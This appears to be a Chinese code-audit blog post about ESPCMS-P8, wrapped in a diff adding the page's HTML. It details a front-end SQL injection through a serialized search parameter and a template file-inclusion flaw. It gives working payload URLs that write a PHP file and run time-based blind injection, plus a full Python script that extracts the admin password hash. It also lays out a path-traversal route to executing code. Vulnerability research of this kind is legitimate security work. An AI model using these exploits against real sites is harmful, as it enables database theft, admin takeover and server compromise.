@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前台SQL注入漏洞简介该SQL注入漏洞位于前台的搜索页面中，构造序列化的恶意参数通过SQL盲注或文件操作利用该漏洞. 原理在espcms_web/Search.php中有如下一段代码:1234567891011121314151617181920212223if ($_GET[&amp;apos;attr_array&amp;apos;]) &amp;#123;	$_REQUEST[&amp;apos;attr_array&amp;ap">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ESPCMS-P8前台SQL注入与文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/03/21/ESPCMS-P8前台SQL注入与文件包含漏洞/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="前台SQL注入漏洞简介该SQL注入漏洞位于前台的搜索页面中，构造序列化的恶意参数通过SQL盲注或文件操作利用该漏洞. 原理在espcms_web/Search.php中有如下一段代码:1234567891011121314151617181920212223if ($_GET[&amp;apos;attr_array&amp;apos;]) &amp;#123;	$_REQUEST[&amp;apos;attr_array&amp;ap">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-21T10:21:28.449Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ESPCMS-P8前台SQL注入与文件包含漏洞">
+<meta name="twitter:description" content="前台SQL注入漏洞简介该SQL注入漏洞位于前台的搜索页面中，构造序列化的恶意参数通过SQL盲注或文件操作利用该漏洞. 原理在espcms_web/Search.php中有如下一段代码:1234567891011121314151617181920212223if ($_GET[&amp;apos;attr_array&amp;apos;]) &amp;#123;	$_REQUEST[&amp;apos;attr_array&amp;ap">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/21/ESPCMS-P8前台SQL注入与文件包含漏洞/">
+
+
+
+
+
+  <title>ESPCMS-P8前台SQL注入与文件包含漏洞 | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/21/ESPCMS-P8前台SQL注入与文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ESPCMS-P8前台SQL注入与文件包含漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-21T17:52:52+08:00">
+                2019-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前台SQL注入漏洞"><a href="#前台SQL注入漏洞" class="headerlink" title="前台SQL注入漏洞"></a>前台SQL注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该SQL注入漏洞位于前台的搜索页面中，构造序列化的恶意参数通过SQL盲注或文件操作利用该漏洞.</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在espcms_web/Search.php中有如下一段代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&apos;attr_array&apos;]) &#123;</span><br><span class="line">	$_REQUEST[&apos;attr_array&apos;] = unserialize(stripslashes($_GET[&apos;attr_array&apos;]));</span><br><span class="line">&#125;</span><br><span class="line">$attr_array = $_REQUEST[&apos;attr_array&apos;] &amp;&amp; is_array($_REQUEST[&apos;attr_array&apos;]) ? $_REQUEST[&apos;attr_array&apos;] : array();</span><br><span class="line">if (is_array($attr_array) &amp;&amp; count($attr_array) &gt; 0) &#123;</span><br><span class="line">	foreach ($attr_array as $key =&gt; $value) &#123;</span><br><span class="line">		if ($value) &#123;</span><br><span class="line">			$db_att_where = &quot; AND isclass=1 AND attrname=&apos;$key&apos;&quot;;</span><br><span class="line">			$countnum = espcms_db_num($db_table_model_att, $db_att_where);</span><br><span class="line">			if ($countnum &gt; 0) &#123;</span><br><span class="line">				if (is_array($value) &amp;&amp; count($value) &gt; 0) &#123;</span><br><span class="line">					$db_where_or = &apos;&apos;;</span><br><span class="line">					foreach ($value as $i =&gt; $where_val) &#123;</span><br><span class="line">						$db_where_or .= $i &gt; 0 ? &quot; OR FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot; : &quot; FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">					$db_where .= &quot; AND ($db_where_or)&quot;;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					$db_where .= &quot; AND b.$key=&apos;$value&apos;&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该处将GET方式接收到的attr_array参数反序列化,然后将attr_array中的每一个键值对取出，如果$value不为空的话会执行下列语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if ($value) &#123;</span><br><span class="line">	$db_att_where = &quot; AND isclass=1 AND attrname=&apos;$key&apos;&quot;;             //漏洞关键点</span><br><span class="line">	$countnum = espcms_db_num($db_table_model_att, $db_att_where);   //漏洞关键点</span><br><span class="line">	if ($countnum &gt; 0) &#123;</span><br><span class="line">		if (is_array($value) &amp;&amp; count($value) &gt; 0) &#123;</span><br><span class="line">			$db_where_or = &apos;&apos;;</span><br><span class="line">			foreach ($value as $i =&gt; $where_val) &#123;</span><br><span class="line">			$db_where_or .= $i &gt; 0 ? &quot; OR FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot; : &quot; FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot;;</span><br><span class="line">							&#125;</span><br><span class="line">			$db_where .= &quot; AND ($db_where_or)&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$db_where .= &quot; AND b.$key=&apos;$value&apos;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$key的值会被拼接到$db_att_where字符串,然后$db_att_where被传入espcms_db_num()函数中,这个过程未做任何过滤，跟进espcms_db_num中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function espcms_db_num($tableName, $db_where = null, $num_str = &apos;*&apos;) &#123;</span><br><span class="line">	global $espcms_link_db;</span><br><span class="line">	if (!$tableName) &#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql_where = &quot; WHERE 1=1&quot; . $db_where;</span><br><span class="line">	$db_sql = &quot;SELECT COUNT($num_str) AS num FROM $tableName $sql_where&quot;;</span><br><span class="line">	$db_read = $espcms_link_db-&gt;db_array_read($db_sql);</span><br><span class="line">	return $db_read[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$db_att_where被拼接到$db_sql中，仍然未做过滤，继续跟进至db_array_read():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function db_array_read($sql) &#123;</span><br><span class="line">	$query = $this-&gt;db_query($sql);</span><br><span class="line">	return $this-&gt;db_array_list($query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里执行了数据库执行了$sql语句，由于从始至终都未做过滤，因此产生了SQL注入漏洞</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p><a href="http://127.0.0.1/install_pack/index.php?ac=Search&amp;at=List&amp;attr_array=a:1:{s:69:&quot;1&#39;" target="_blank" rel="noopener">http://127.0.0.1/install_pack/index.php?ac=Search&amp;at=List&amp;attr_array=a:1:{s:69:&quot;1&#39;</a> union select “&lt;?php phpinfo(); ?&gt;” into dumpfile “c:\\1234.php”–+”;s:3:”aaa”;}&amp;keyword=1  </p>
+<p>可以写入一个php文件</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><a href="http://127.0.0.1/install_pack/index.php?ac=Search&amp;at=List&amp;attr_array=a:1:{s:64:&quot;1&#39;" target="_blank" rel="noopener">http://127.0.0.1/install_pack/index.php?ac=Search&amp;at=List&amp;attr_array=a:1:{s:64:&quot;1&#39;</a> union select if(ascii(substr(user(),1,1))=114,sleep(10),1)–+”;s:3:”aaa”;}&amp;keyword=1<br>成功延迟10秒，说明用户名第一位是’r’</p>
+<h2 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/python</span><br><span class="line">#coding = utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># target:</span><br><span class="line">url = &quot;http://127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">s = &quot;/index.php?ac=Search&amp;at=List&amp;keyword=1&amp;&quot;</span><br><span class="line"># payload:</span><br><span class="line">payload = &quot;attr_array=a:1:&#123;s:104:\&quot;1&apos; union select if(ascii(substr((select admin_password from espcms_admin_member),%d,1))&gt;%d,sleep(5),1)--+\&quot;;s:3:\&quot;aaa\&quot;;&#125;&quot;</span><br><span class="line">payload2 = &quot;attr_array=a:1:&#123;s:105:\&quot;1&apos; union select if(ascii(substr((select admin_password from espcms_admin_member),%d,1))&gt;%d,sleep(5),1)--+\&quot;;s:3:\&quot;aaa\&quot;;&#125;&quot;</span><br><span class="line">payload4 = &quot;attr_array=a:1:&#123;s:106:\&quot;1&apos; union select if(ascii(substr((select admin_password from espcms_admin_member),%d,1))&gt;%d,sleep(5),1)--+\&quot;;s:3:\&quot;aaa\&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">def Get_User(lenth):</span><br><span class="line">    name = &apos;&apos;</span><br><span class="line">    x = 0</span><br><span class="line">    i = 1</span><br><span class="line">    while i&lt;lenth+1:</span><br><span class="line">        try:</span><br><span class="line">            l = 0</span><br><span class="line">            r = 126</span><br><span class="line">            while l &lt;= r:</span><br><span class="line">                x = (l + r) // 2</span><br><span class="line">                if x &gt; 99 and i &lt; 10:</span><br><span class="line">                    target = url + s + payload2 % (i, x)</span><br><span class="line">                elif x &lt; 99 and i &lt; 10:</span><br><span class="line">                    target = url + s + payload % (i, x)</span><br><span class="line">                elif x &gt; 99 and i &gt;= 10:</span><br><span class="line">                    target = url + s + payload4 % (i,x)</span><br><span class="line">                else:</span><br><span class="line">                    target = url + s + payload2 % (i,x)</span><br><span class="line">                print(target)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                response = requests.get(target, timeout = 20)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                print(x)</span><br><span class="line">                if end_time - start_time &lt; 5 :</span><br><span class="line">                    r = x - 1</span><br><span class="line">                else:</span><br><span class="line">                    l = x + 1</span><br><span class="line">            x = (l + r) // 2 + 1</span><br><span class="line">            name = name + chr(x)</span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            response.status_code = &quot;Connection refused&quot;</span><br><span class="line">            print(&apos;retry....&apos;)</span><br><span class="line">            time.sleep(2)</span><br><span class="line">            i = i - 1</span><br><span class="line">        i += 1</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;start......\n&quot;)</span><br><span class="line">    name = Get_User(32)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在espcms_web/Member.php中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">	public static function in_JsLogin() &#123;</span><br><span class="line">		global $espcms_web_templates, $espcms_command;</span><br><span class="line">		$espcms_web_templates-&gt;libfile = true;</span><br><span class="line">		$member_app_config = ESPCMS_Core::get_app_config(&apos;member&apos;, false);</span><br><span class="line">		if (!$member_app_config[&apos;isetup&apos;] || !$member_app_config[&apos;isopen&apos;]) &#123;</span><br><span class="line">			ESPCMS_Dialog::Message_Page(&apos;app_close&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">		$member_con = unserialize($member_app_config[&apos;appconfig&apos;]);</span><br><span class="line">		if (ESPCMS_MemberAuthority::authorityWebVerify(true)) &#123;</span><br><span class="line">			$member_info = ESPCMS_MemberAuthority::getMemberInfo();</span><br><span class="line">			$filename = $_GET[&apos;info_file&apos;] ? $_GET[&apos;info_file&apos;] : &apos;member_info&apos;;</span><br><span class="line">			$espcms_web_templates-&gt;into(&apos;member&apos;, $member_info);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$filename = $_GET[&apos;login_file&apos;] ? $_GET[&apos;login_file&apos;] : &apos;member_login&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">		$espcms_web_templates-&gt;into(&apos;tokenkey&apos;, token(&apos;member_login&apos;));</span><br><span class="line">		$espcms_web_templates-&gt;into(&apos;mlink&apos;, MemberLink::get_link());</span><br><span class="line">		$espcms_web_templates-&gt;into(&apos;seccodelink&apos;, PublicLink::get_verfication(&apos;seccodelink&apos;));</span><br><span class="line">		$espcms_web_templates-&gt;into(&apos;verify_isopen&apos;, $member_con[&apos;MEMBER_LOGIN_VERIFY&apos;] &amp;&amp; $espcms_command[&apos;SAFETY_ISVERIFICATION_CODE&apos;] ? 1 : 0);</span><br><span class="line">		$espcms_web_templates-&gt;into(&apos;member_con&apos;, $member_con);</span><br><span class="line">		$output = $espcms_web_templates-&gt;fetch(&apos;lib/&apos; . $filename);</span><br><span class="line">		$outHTML = addslashes($output);</span><br><span class="line">		$textArray = preg_split(&apos;/[\r\n]/i&apos;, $outHTML);</span><br><span class="line">		if (is_array($textArray)) &#123;</span><br><span class="line">			$outHTML = null;</span><br><span class="line">			foreach ($textArray as $key =&gt; $value) &#123;</span><br><span class="line">				$outHTML .= &apos;document.write(&quot;&apos; . $value . &apos;&quot;);&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			exit($outHTML);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			exit(&apos;document.writeln(&quot;&apos; . $outHTML . &apos;&quot;)&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该段代码先读入$filename参数,然后:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$out = $espcms_web_templates-&gt;fetch(&apos;lib/&apos; . $filename);</span><br></pre></td></tr></table></figure></p>
+<p>$filename被传入espcms_web_templates-&gt;fetch()中,跟进:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public function fetch($fetch_filename, $cache_fileid = null, $out_html = null, $ispack = false) &#123;</span><br><span class="line">	......</span><br><span class="line">	require_once &apos;ESPCMS_Templates_Parser.php&apos;;</span><br><span class="line">	if ($this-&gt;libfile) &#123;</span><br><span class="line">		$fetch_filename = $this-&gt;templates_themss_dirname . $fetch_filename . $this-&gt;templatesfileex;</span><br><span class="line">		$templates_filename = $this-&gt;templates_path_dir . $fetch_filename;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$templates_filename = $this-&gt;templates_path_dir . $fetch_filename;</span><br><span class="line">	&#125;</span><br><span class="line">	$parsed_file = $this-&gt;html_compile_dir . md5($templates_filename) . &apos;.php&apos;;</span><br><span class="line">	if ($this-&gt;iscaching) &#123;</span><br><span class="line">		if ($this-&gt;tempcheckcache($fetch_filename, $cache_fileid)) &#123;</span><br><span class="line">			if (!file_exists($parsed_file) || filemtime($parsed_file) &lt; filemtime($templates_filename)) &#123;</span><br><span class="line">				$this-&gt;_parser = new ESPCMS_Templates_Parser();</span><br><span class="line">				$this-&gt;_parser-&gt;compile($fetch_filename, $this-&gt;templates_path_dir, $this-&gt;templates_themss_dirname, $this-&gt;html_compile_dir, $this-&gt;left_delimiter, $this-&gt;right_delimiter);</span><br><span class="line">			&#125;</span><br><span class="line">			$this-&gt;tempcachesave($fetch_filename, $cache_fileid);</span><br><span class="line">			$out = $this-&gt;template_out;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$out = $this-&gt;template_out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if (!file_exists($parsed_file) || filemtime($parsed_file) &lt; filemtime($templates_filename)) &#123;</span><br><span class="line">			$this-&gt;_parser = new ESPCMS_Templates_Parser();</span><br><span class="line">			$this-&gt;_parser-&gt;compile($fetch_filename, $this-&gt;templates_path_dir, $this-&gt;templates_themss_dirname, $this-&gt;html_compile_dir, $this-&gt;left_delimiter, $this-&gt;right_delimiter);</span><br><span class="line">		&#125;</span><br><span class="line">		if ($this-&gt;libfile) &#123;</span><br><span class="line">			$out = $this-&gt;temprequire($parsed_file);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$out = file_get_contents($parsed_file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br></pre></td></tr></table></figure></p>
+<p>其中$parsed_file是由传入的MD5($filename)加路径构成的php文件,跟进后发现如果$filename最近改动过的话会重新将其传入$parsed_file中,然后$parsed_file传入$this-&gt;temprequire()中,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span><br><span class="line">	if (!file_exists($parsed_file) || filemtime($parsed_file) &lt; filemtime($templates_filename)) &#123;</span><br><span class="line">		$this-&gt;_parser = new ESPCMS_Templates_Parser();</span><br><span class="line">		$this-&gt;_parser-&gt;compile($fetch_filename, $this-&gt;templates_path_dir, $this-&gt;templates_themss_dirname, $this-&gt;html_compile_dir, $this-&gt;left_delimiter, $this-&gt;right_delimiter);</span><br><span class="line">	&#125;</span><br><span class="line">	if ($this-&gt;libfile) &#123;</span><br><span class="line">		$out = $this-&gt;temprequire($parsed_file);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$out = file_get_contents($parsed_file);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$this-&gt;temprequire()函数中会包含$parsed_file:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function temprequire($filename) &#123;</span><br><span class="line">	ob_start();</span><br><span class="line">	include $filename;         //关键点</span><br><span class="line">	$content = ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><p>结合第一个漏洞获取后台账户密码后登入后台，然后更改模板文件(随意更改一个),初始目录是/cn/lib/,可以使用../进行目录穿越,在特定情况下还会造成目录暴露,例如修改cn/index.html文件.<br>最后在前台访问：10.10.10.132/install_pack/index.php?ac=Member&amp;at=JsLogin&amp;login_file=../index<br>即执行恶意代码.</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/10/sqlmap与一次渗透实战/" rel="next" title="sqlmap与一次渗透实战">
+                <i class="fa fa-chevron-left"></i> sqlmap与一次渗透实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
